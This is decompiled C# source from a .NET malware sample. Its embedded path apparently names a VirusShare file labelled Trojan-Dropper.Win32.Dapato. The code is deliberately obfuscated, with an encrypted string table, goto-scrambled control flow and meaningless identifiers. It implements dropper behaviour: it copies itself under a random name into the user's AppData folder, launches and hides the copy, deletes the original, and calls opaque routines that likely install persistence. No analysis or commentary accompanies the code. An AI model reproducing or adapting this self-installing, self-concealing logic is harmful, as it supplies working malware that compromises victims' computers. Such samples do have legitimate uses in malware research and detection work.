// Decompiled with JetBrains decompiler
// Type: 
// Assembly: test1, Version=1.1.1.1, Culture=neutral, PublicKeyToken=null
// MVID: 662E0D26-44B1-4CB3-A471-62FCF116719C
// Assembly location: C:\Users\Administrateur\Desktop\Virusshare-00005-msil\Trojan-Dropper.Win32.Dapato.avhp-90698af0c93ba576f80ff28d19a584ba79cf782a81be72cd7a8ad52c0f8c2802.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.IO;
using System.Reflection;
using System.Text;
using System.Threading;
using xDyrwegfyiLGERLFK;

[StandardModule]
internal sealed class \u0008
{
  private static bool \u0002;
  private static string \u0003;

  static \u0008()
  {
    string location = Assembly.GetExecutingAssembly().Location;
    if (false)
      return;
    \u0008.\u0003 = location;
  }

  public static string \u0002(int _param0)
  {
    VBMath.Randomize();
    StringBuilder stringBuilder1 = new StringBuilder(string.Empty);
    if (true)
      goto label_7;
label_1:
    char[] charArray = \u000F.\u0002(-1311342600).ToCharArray();
    if (true)
      goto label_8;
label_2:
    int num1 = _param0;
    if (true)
      goto label_9;
label_3:
    int num2 = 1;
    char[] chArray;
    StringBuilder stringBuilder2;
    int num3;
    while (num2 <= num3)
    {
      VBMath.Randomize();
      int index = checked ((int) Math.Round((double) unchecked (Conversion.Int((float) checked (chArray.Length - 2 - 0 + 1) * VBMath.Rnd()) + 1f)));
      stringBuilder2.Append(chArray[index]);
      checked { ++num2; }
    }
    return stringBuilder2.ToString();
label_9:
    num3 = num1;
    goto label_3;
label_8:
    chArray = charArray;
    goto label_2;
label_7:
    stringBuilder2 = stringBuilder1;
    goto label_1;
  }

  [STAThread]
  public static void \u0002()
  {
    Random random = new Random();
    if (true)
      goto label_12;
label_1:
    string str1 = \u0008.\u0002(10) + \u000F.\u0002(-1311342653);
    if (true)
      goto label_13;
label_2:
    string str2;
    try
    {
      Thread.Sleep(273);
      string str3 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + \u000F.\u0002(-1311342666);
      if (true)
        goto label_9;
label_3:
      string path;
      if (!Directory.Exists(path))
        Directory.CreateDirectory(path);
      if (!\u0008.\u0003.Contains(path))
      {
        try
        {
          FileSystem.FileCopy(\u0008.\u0003, path + \u000F.\u0002(-1311342694) + str2);
          Interaction.Shell(path + \u000F.\u0002(-1311342694) + str2 + \u000F.\u0002(-1311342702) + \u0008.\u0003);
          FileAttributes fileAttributes = FileAttributes.Hidden;
          File.SetAttributes(path + \u000F.\u0002(-1311342694) + str2, fileAttributes);
          ProjectData.EndApp();
          goto label_11;
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          int num = (int) Interaction.MsgBox((object) ex.ToString());
          ProjectData.ClearProjectError();
          goto label_11;
        }
      }
      else
      {
        FileSystem.Kill(Interaction.Command());
        goto label_11;
      }
label_9:
      path = str3;
      goto label_3;
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
label_11:
    \u0008.\u0002 = true;
    eyLVVDhbWEkldwLK.bUfdeuYwyoegegejwgLkwe(\u000F.\u0002(-1311342710) + \u0008.\u0003);
    \u0008.\u0003();
    return;
label_13:
    str2 = str1;
    goto label_2;
label_12:
    goto label_1;
  }

  public static void \u0003()
  {
    if (\u0008.\u0002)
    {
      eyLVVDhbWEkldwLK.ORYfbwIYVEwRFjbwrFgbwrigi(\u000F.\u0002(-1311343020));
      eyLVVDhbWEkldwLK.LIJVwieyfvwEJfwEIyfI(\u000F.\u0002(-1311343020));
    }
    \u0008.\u0003();
  }
}
